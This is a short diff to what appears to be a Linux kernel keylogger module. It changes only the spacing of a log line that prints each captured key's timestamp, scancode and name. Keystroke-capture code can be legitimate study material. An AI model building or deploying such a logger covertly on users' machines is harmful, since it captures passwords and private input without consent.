@@ -291,7 +291,7 @@ static int keylog_device_release(struct inode *inode, struct file *file) {
 
 		if (scanset_contains(e->keycode) && e->state == KEY_PRESS) {
 			printk(KERN_INFO "Keylog: %.2lu:%.2lu:%.2lu", (e->time.tv_sec / (60 * 60)) % 24, (e->time.tv_sec / 60) % 60, e->time.tv_sec % 60);
-			printk(KERN_CONT "-  %#.2x (%s) %s", e->keycode, scancode_set1[e->keycode].name, e->state == KEY_PRESS ? "Pressed" : "Released");
+			printk(KERN_CONT " - %#.2x (%s) %s", e->keycode, scancode_set1[e->keycode].name, e->state == KEY_PRESS ? "Pressed" : "Released");
 		}
 		list_del(cur);
 		kfree(e);
